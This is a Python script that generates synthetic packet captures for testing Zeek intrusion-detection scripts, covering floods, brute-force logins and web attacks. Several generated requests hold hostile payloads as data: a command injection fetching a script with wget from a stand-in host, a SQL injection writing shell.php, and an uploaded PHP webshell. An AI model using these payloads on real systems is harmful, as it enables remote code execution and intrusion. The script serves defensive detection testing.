#!/usr/bin/env python3
"""Generate deterministic offline PCAPs for all Zeek detector scripts."""

import os
import socket
import struct
import time

OUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "pcaps")


def csum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def ip(addr):
    return socket.inet_aton(addr)


def mac(text):
    return bytes(int(part, 16) for part in text.split(":"))


def eth(payload):
    return mac("02:00:00:00:00:02") + mac("02:00:00:00:00:01") + struct.pack("!H", 0x0800) + payload


def ipv4(src, dst, proto, payload, ident):
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), ident & 0xFFFF, 0x4000, 64, proto, 0, ip(src), ip(dst))
    return hdr[:10] + struct.pack("!H", csum(hdr)) + hdr[12:] + payload


def tcp(src, dst, sport, dport, seq, ack, flags, payload=b"", ident=1):
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 8192, 0, 0)
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, 6, len(hdr) + len(payload))
    hdr = hdr[:16] + struct.pack("!H", csum(pseudo + hdr + payload)) + hdr[18:]
    return eth(ipv4(src, dst, 6, hdr + payload, ident))


def udp(src, dst, sport, dport, payload, ident=1):
    hdr = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, 17, len(hdr) + len(payload))
    hdr = hdr[:6] + struct.pack("!H", csum(pseudo + hdr + payload)) + hdr[8:]
    return eth(ipv4(src, dst, 17, hdr + payload, ident))


def write_pcap(name, packets):
    os.makedirs(OUT_DIR, exist_ok=True)
    with open(os.path.join(OUT_DIR, name), "wb") as fh:
        fh.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        base = int(time.time())
        for i, pkt in enumerate(packets):
            fh.write(struct.pack("<IIII", base + i // 1000, (i % 1000) * 1000, len(pkt), len(pkt)))
            fh.write(pkt)


def dns_query(name, qtype, tid):
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    return struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + labels + struct.pack("!HH", qtype, 1)


def http_exchange(src, dst, sport, request, response, ident):
    cseq, sseq = 1000 + sport, 8000 + sport
    return [
        tcp(src, dst, sport, 80, cseq, 0, 0x02, ident=ident),
        tcp(dst, src, 80, sport, sseq, cseq + 1, 0x12, ident=ident + 1),
        tcp(src, dst, sport, 80, cseq + 1, sseq + 1, 0x10, ident=ident + 2),
        tcp(src, dst, sport, 80, cseq + 1, sseq + 1, 0x18, request, ident=ident + 3),
        tcp(dst, src, 80, sport, sseq + 1, cseq + 1 + len(request), 0x10, ident=ident + 4),
        tcp(dst, src, 80, sport, sseq + 1, cseq + 1 + len(request), 0x18, response, ident=ident + 5),
        tcp(src, dst, sport, 80, cseq + 1 + len(request), sseq + 1 + len(response), 0x10, ident=ident + 6),
        tcp(src, dst, sport, 80, cseq + 1 + len(request), sseq + 1 + len(response), 0x11, ident=ident + 7),
    ]


def http_req(method, uri, headers=None, body=b""):
    headers = headers or {}
    base = f"{method} {uri} HTTP/1.1\r\nHost: target.local\r\n".encode()
    if body and "Content-Length" not in headers:
        headers["Content-Length"] = str(len(body))
    return base + b"".join(f"{k}: {v}\r\n".encode() for k, v in headers.items()) + b"\r\n" + body


def http_resp(content_type="text/plain", body=b"OK", code=200):
    reason = {200: "OK", 401: "Unauthorized", 403: "Forbidden"}.get(code, "OK")
    return f"HTTP/1.1 {code} {reason}\r\nContent-Type: {content_type}\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body


def gen_syn_flood():
    write_pcap("syn_flood_test.pcap", [tcp("192.168.50.10", "192.168.50.20", 20000 + i, 80, 1000 + i, 0, 0x02, ident=i + 1) for i in range(150)])


def gen_dns_flood():
    packets = [udp("192.168.51.10", "192.168.51.53", 30000 + i, 53, dns_query(f"flood{i}.example.com", 255 if i < 25 else 1, i + 1), ident=i + 1) for i in range(130)]
    write_pcap("dns_flood_test.pcap", packets)


def gen_http_bruteforce():
    packets = []
    for i in range(5):
        body = f"username=admin&password=bad{i}".encode()
        packets += http_exchange("192.168.52.10", "192.168.52.20", 31000 + i, http_req("POST", "/login", {"Content-Type": "application/x-www-form-urlencoded"}, body), http_resp(code=401, body=b""), 100 + i * 20)
    write_pcap("http_bruteforce_test.pcap", packets)


def gen_anomalous_traffic():
    src, dst, sport = "192.168.53.10", "192.168.53.20", 32000
    packets = [tcp(src, dst, sport, 443, 1000, 0, 0x02, ident=1), tcp(dst, src, 443, sport, 9000, 1001, 0x12, ident=2), tcp(src, dst, sport, 443, 1001, 9001, 0x10, ident=3)]
    seq = 1001
    for i in range(3300):
        packets.append(tcp(src, dst, sport, 443, seq, 9001, 0x18, b"A" * 1400, ident=4 + i))
        seq += 1400
    packets.append(tcp(src, dst, sport, 443, seq, 9001, 0x11, ident=4000))
    write_pcap("anomalous_traffic_test.pcap", packets)


def gen_http_flood():
    packets = []
    for i in range(130):
        packets += http_exchange("192.168.57.10", "192.168.57.20", 36000 + i, http_req("GET", f"/index.html?i={i}"), http_resp(body=b"ok"), 1000 + i * 10)
    write_pcap("http_flood_test.pcap", packets)


def gen_bulk_download():
    packets = []
    body = b"PK\x03\x04" + b"Z" * 4096
    for i in range(55):
        packets += http_exchange("192.168.58.10", "192.168.58.20", 37000 + i, http_req("GET", f"/files/pkg{i}.zip"), http_resp("application/zip", body), 3000 + i * 10)
    write_pcap("bulk_download_test.pcap", packets)


def gen_file_tampering():
    write_pcap("file_tampering_test.pcap", http_exchange("192.168.54.10", "192.168.54.20", 33000, http_req("GET", "/etc/passwd"), http_resp(body=b"root:x:0:0:root:/root:/bin/sh\n"), 500))


def gen_http_cmd_injection():
    write_pcap("http_cmd_injection_test.pcap", http_exchange("192.168.59.10", "192.168.59.20", 38000, http_req("GET", "/cgi-bin/status?x=;wget%20http://bad/p.sh"), http_resp(), 4000))


def gen_http_suspicious_ua():
    write_pcap("http_suspicious_ua_test.pcap", http_exchange("192.168.60.10", "192.168.60.20", 39000, http_req("GET", "/", {"User-Agent": "sqlmap/1.7"}), http_resp(), 4100))


def gen_sqli_webshell():
    uri = "/item?id=1%20union%20select%201,2%20into%20outfile%20'/var/www/html/shell.php'"
    write_pcap("sqli_webshell_test.pcap", http_exchange("192.168.61.10", "192.168.61.20", 40000, http_req("GET", uri), http_resp(), 4200))


def gen_http_webshell():
    boundary = "----zeektest"
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['x']); ?>\r\n--{boundary}--\r\n").encode()
    req = http_req("POST", "/upload", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
    write_pcap("http_webshell_test.pcap", http_exchange("192.168.62.10", "192.168.62.20", 41000, req, http_resp(), 4300))


def gen_slammer_worm():
    packets = [udp("192.168.63.10", "192.168.63.20", 42000 + i, 1434, b"\x04" + b"A" * 376, ident=5000 + i) for i in range(3)]
    write_pcap("slammer_worm_test.pcap", packets)


def gen_ssh_file_transfer():
    src, dst, sport = "192.168.64.10", "192.168.64.20", 43000
    cseq, sseq = 1000, 9000
    packets = [
        tcp(src, dst, sport, 22, cseq, 0, 0x02, ident=6000),
        tcp(dst, src, 22, sport, sseq, cseq + 1, 0x12, ident=6001),
        tcp(src, dst, sport, 22, cseq + 1, sseq + 1, 0x10, ident=6002),
        tcp(dst, src, 22, sport, sseq + 1, cseq + 1, 0x18, b"SSH-2.0-OpenSSH_9.6\r\n", ident=6003),
        tcp(src, dst, sport, 22, cseq + 1, sseq + 22, 0x18, b"SSH-2.0-OpenSSH_9.6\r\n", ident=6004),
    ]
    cseq += 22
    for i in range(820):
        packets.append(tcp(src, dst, sport, 22, cseq + 1, sseq + 22, 0x18, b"S" * 1400, ident=6010 + i))
        cseq += 1400
    packets += [
        tcp(dst, src, 22, sport, sseq + 22, cseq + 1, 0x10, ident=6900),
        tcp(src, dst, sport, 22, cseq + 1, sseq + 22, 0x11, ident=6901),
    ]
    write_pcap("ssh_file_transfer_test.pcap", packets)


def gen_intel_hit():
    write_pcap("intel_hit_test.pcap", http_exchange("192.168.55.10", "162.243.103.246", 34000, http_req("GET", "/"), http_resp(body=b""), 600))


def gen_file_extract():
    body = b"MZ" + b"A" * 30000
    write_pcap("file_extract_test.pcap", http_exchange("192.168.56.10", "192.168.56.20", 35000, http_req("GET", "/downloads/firmware.bin"), http_resp("application/octet-stream", body), 700))


def main():
    for fn in [
        gen_anomalous_traffic, gen_bulk_download, gen_dns_flood, gen_file_tampering,
        gen_http_bruteforce, gen_http_cmd_injection, gen_http_flood, gen_http_suspicious_ua,
        gen_http_webshell, gen_intel_hit, gen_slammer_worm, gen_sqli_webshell,
        gen_ssh_file_transfer, gen_syn_flood, gen_file_extract,
    ]:
        fn()


if __name__ == "__main__":
    main()
